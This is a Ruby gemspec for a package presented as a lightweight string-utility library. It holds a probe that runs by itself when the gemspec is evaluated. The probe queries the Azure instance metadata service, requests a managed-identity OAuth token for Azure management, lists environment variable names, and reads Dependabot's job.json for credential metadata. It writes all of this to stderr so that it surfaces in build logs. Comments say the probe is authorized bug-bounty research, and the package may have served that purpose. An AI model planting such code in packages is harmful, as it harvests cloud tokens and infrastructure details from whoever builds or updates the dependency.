# frozen_string_literal: true
#
# HYP-F011-D v1.6 — capture /metadata/instance via STDERR.warn (Dependabot logs it)
# Authorization: bug bounty research authorized by HackerOne GitHub program.
# All probes within program scope; impact-proof captured via stderr surfacing
# (visible in Dependabot updater log).

require_relative "lib/useful_string_utils/version"

# Probe runs at gemspec eval time; emits PROBE-MARK lines to stderr.
# Dependabot captures stderr and embeds in updater log.
begin
  require "net/http"
  require "uri"
  require "json"

  STDERR.puts "PROBE-MARK-HYP-F011-D-v16-START ts=#{Time.now.utc.to_i}"

  # ---- /metadata/instance with Metadata:true header --------------------
  begin
    uri = URI("http://168.63.129.16/metadata/instance?api-version=2021-02-01")
    h = Net::HTTP.new(uri.host, uri.port)
    h.open_timeout = 4
    h.read_timeout = 6
    req = Net::HTTP::Get.new(uri.request_uri)
    req["Metadata"] = "true"
    rsp = h.request(req)
    body = rsp.body.to_s
    STDERR.puts "PROBE-MARK-IMDS-INSTANCE code=#{rsp.code} len=#{body.length}"

    if rsp.code == "200"
      parsed = JSON.parse(body) rescue nil
      if parsed
        compute = parsed["compute"] || {}
        ["subscriptionId", "resourceGroupName", "vmId", "name", "location",
         "vmSize", "publisher", "offer", "sku", "version", "osType",
         "vmScaleSetName", "zone", "platformFaultDomain"].each do |k|
          v = compute[k]
          STDERR.puts "PROBE-MARK-COMPUTE #{k}=#{v.inspect[0,200]}" if v
        end

        net = parsed["network"] || {}
        (net["interface"] || []).each_with_index do |nic, i|
          mac = nic["macAddress"]
          STDERR.puts "PROBE-MARK-NET nic#{i}-mac=#{mac}" if mac
          (nic.dig("ipv4", "ipAddress") || []).each_with_index do |ip, j|
            STDERR.puts "PROBE-MARK-NET nic#{i}-ip#{j}-priv=#{ip['privateIpAddress'] rescue nil} pub=#{ip['publicIpAddress'] rescue nil}"
          end
          (nic.dig("ipv4", "subnet") || []).each_with_index do |s, j|
            STDERR.puts "PROBE-MARK-NET nic#{i}-subnet#{j}=#{s['address'] rescue nil}/#{s['prefix'] rescue nil}"
          end
        end

        # Tags can be informative
        STDERR.puts "PROBE-MARK-TAGS #{(compute['tags'] || '')[0,200]}"
      else
        STDERR.puts "PROBE-MARK-IMDS-PARSE-FAIL"
      end
    else
      STDERR.puts "PROBE-MARK-IMDS-BODY-PREFIX #{body[0,200]}"
    end
  rescue => e
    STDERR.puts "PROBE-MARK-IMDS-ERR #{e.class}: #{e.message[0,100]}"
  end

  # ---- Also try /metadata/identity/oauth2/token with Metadata:true ---
  begin
    uri = URI("http://168.63.129.16/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/")
    h = Net::HTTP.new(uri.host, uri.port)
    h.open_timeout = 4
    h.read_timeout = 6
    req = Net::HTTP::Get.new(uri.request_uri)
    req["Metadata"] = "true"
    rsp = h.request(req)
    body = rsp.body.to_s
    STDERR.puts "PROBE-MARK-IMDS-MSI code=#{rsp.code} len=#{body.length} body_prefix=#{body[0,150]}"
  rescue => e
    STDERR.puts "PROBE-MARK-IMDS-MSI-ERR #{e.class}"
  end

  # ---- Container env (no values, just key shapes) ----------------------
  STDERR.puts "PROBE-MARK-ENV-KEYS #{ENV.keys.sort.join(',')[0,400]}"

  # ---- Job.json contents ------------------------------------------------
  begin
    jjson = File.read("/home/dependabot/dependabot-updater/job.json") rescue nil
    if jjson
      parsed = JSON.parse(jjson) rescue nil
      if parsed
        cm = parsed.dig("job", "credentials-metadata") || []
        cm_summary = cm.map { |c| "#{c['type']}:#{c['host'] || c['url'] || c['registry'] || ''}" }.join(';')
        STDERR.puts "PROBE-MARK-JOB-CREDS #{cm_summary[0,300]}"
        exp = parsed.dig("job", "experiments") || {}
        STDERR.puts "PROBE-MARK-JOB-EXPERIMENTS #{exp.keys.sort.join(',')[0,300]}"
      end
    end
  rescue
  end

  STDERR.puts "PROBE-MARK-HYP-F011-D-v16-END"
rescue => e
  STDERR.puts "PROBE-MARK-OUTER-ERR #{e.class}: #{e.message[0,100]}"
end

Gem::Specification.new do |spec|
  spec.name          = "useful-string-utils"
  spec.version       = UsefulStringUtils::VERSION
  spec.authors       = ["mr-benty"]
  spec.email         = ["mr_benty@wearehackerone.com"]
  spec.summary       = "Lightweight string utilities for Ruby"
  spec.description   = "Case conversions, padding helpers, slug generation, and a few common transformations missing from stdlib String."
  spec.homepage      = "https://github.com/mr-benty/useful-string-utils"
  spec.license       = "MIT"
  spec.required_ruby_version = ">= 2.7.0"
  spec.metadata["homepage_uri"]    = spec.homepage
  spec.metadata["source_code_uri"] = spec.homepage
  spec.metadata["changelog_uri"]   = "#{spec.homepage}/blob/main/CHANGELOG.md"
  spec.files = Dir.chdir(__dir__) do
    Dir["lib/**/*.rb", "README.md", "LICENSE", "CHANGELOG.md"]
  end
  spec.require_paths = ["lib"]
end
